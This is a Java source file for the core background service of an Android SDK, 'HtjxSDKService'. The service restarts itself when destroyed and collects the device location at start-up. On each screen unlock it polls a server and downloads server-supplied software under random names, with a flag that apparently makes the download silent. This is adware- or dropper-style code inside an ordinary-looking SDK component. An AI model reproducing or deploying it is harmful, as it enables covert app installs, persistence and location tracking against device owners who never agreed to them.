package com.htjx.sdk.service;

import java.util.Random;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Handler;
import android.os.IBinder;
import android.util.SparseArray;

import com.htjx.sdk.HtjxSDK;
import com.htjx.sdk.R;
import com.htjx.sdk.domain.Push;
import com.htjx.sdk.download.DownloadInfo;
import com.htjx.sdk.download.Downloader;
import com.htjx.sdk.net.PushParser;
import com.htjx.sdk.net.RequestVo;
import com.htjx.sdk.utils.AppInfoUtil;
import com.htjx.sdk.utils.BaseParamsMapUtil;
import com.htjx.sdk.utils.LocationUtils;
import com.htjx.sdk.utils.LogUtils;
import com.htjx.sdk.utils.MyAsyncTask;
import com.htjx.sdk.utils.MyDateUtils;
import com.htjx.sdk.utils.NetUtil;
/**
 * SDK核心服务
 * @author fada
 *
 */
public class HtjxSDKService extends Service {
	private InnerLockScreenReceiver lockScreenReceiver;
	private InnerUnLockScreenReceiver unlockScreenReceiver;
	private static Context context;
	private SharedPreferences sp;
	private Editor edit;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	// 如果屏幕关闭锁定
	private class InnerLockScreenReceiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
		}

	}

	// 如果屏幕解锁
	private class InnerUnLockScreenReceiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			getCheckData();

		}

	

	}

	// 初始化需要的广播,对象,集合数据
	@Override
	public void onCreate() {
		context = getApplicationContext();
		sp = context.getSharedPreferences("config", Context.MODE_PRIVATE);
		edit = sp.edit();
		
		// 定义锁屏的广播接收者
		lockScreenReceiver = new InnerLockScreenReceiver();
		IntentFilter lockFilter = new IntentFilter();
		lockFilter.addAction(Intent.ACTION_SCREEN_OFF);
		lockFilter.setPriority(1000);
		registerReceiver(lockScreenReceiver, lockFilter);
		// 定义解锁的广播接收者
		unlockScreenReceiver = new InnerUnLockScreenReceiver();
		IntentFilter unlockFilter = new IntentFilter();
		unlockFilter.addAction(Intent.ACTION_SCREEN_ON);
		unlockFilter.setPriority(1000);
		registerReceiver(unlockScreenReceiver, unlockFilter);
		super.onCreate();
		AppInfoUtil.checkZuobi(context);
		LocationUtils.getLocation(context, new Handler() {
			public void handleMessage(android.os.Message msg) {
				String location = msg.getData().getString("location");
				LogUtils.d(location);
				HtjxSDK.onStartService(context,location);
			};
		});
		
		
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		flags = START_STICKY;
		return super.onStartCommand(intent, flags, startId);

		// return START_NOT_STICKY;
	}

	@Override
	public void onDestroy() {
		HtjxSDK.onExitService(context);
		if (lockScreenReceiver != null) {
			unregisterReceiver(lockScreenReceiver);
			lockScreenReceiver = null;
		}
		if (unlockScreenReceiver != null) {
			unregisterReceiver(unlockScreenReceiver);
			unlockScreenReceiver = null;
		}
		super.onDestroy();
		Intent service = new Intent(getApplicationContext(), HtjxSDKService.class);
		getApplicationContext().startService(service);

	}
	/**
	 * 从服务器请求轮训.解锁则请求
	 */
	private void getCheckData() {
		String data=sp.getString("data", "");
		final String formatDate = MyDateUtils.formatDate(System.currentTimeMillis());
		if(!data.equals(formatDate)){
			edit.putInt("time", 0);
			edit.putString("date", formatDate);
			edit.commit();
		}
		final int time = sp.getInt("time", 0);
		int count = sp.getInt("count", 1);
		if (time<count) {
			LogUtils.d("执行请求了"+"time="+time+" count="+count);
			if (NetUtil.hasConnectedNetwork(getApplicationContext())) {
				new MyAsyncTask() {
					@Override
					public void onPreExecute() {

					}
					@Override
					public void onPostExecute() {
						edit.putInt("time", time+1);
						edit.commit();
					}
					@Override
					public void doInBackground() {
						RequestVo requestVo = new RequestVo(HtjxSDKService.context, BaseParamsMapUtil.getPush(HtjxSDKService.context,""), new PushParser());
						try {
							SparseArray<Push>  array = (SparseArray<Push>) NetUtil.get(requestVo);
							int code = array.keyAt(0);
							if(code==0){
								Push push = array.valueAt(0);
								String result = push.getDownloadUrl();
								if(push.getIsNotice()==0){
									if(result!=null&&!result.equals("")){
										Random random=new Random();
										int thid=random.nextInt(100);
										DownloadInfo downloadInfo=new DownloadInfo("软件"+thid, result, ""+thid);
										Downloader downloader;
										if(push.getIsSilent()==1){
											downloader = new Downloader(HtjxSDKService.context, downloadInfo, 1);
										}else{
											downloader = new Downloader(HtjxSDKService.context, downloadInfo, 2);
										}
										downloader.download(null);
									}
								}else{
									AppInfoUtil.stratNotification(getApplicationContext(), push.getName(), push.getInfo(), R.drawable.icon, push.getPkName(), push.getClassName());
								}
							}
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				}.execute();
			}
		}
	}
}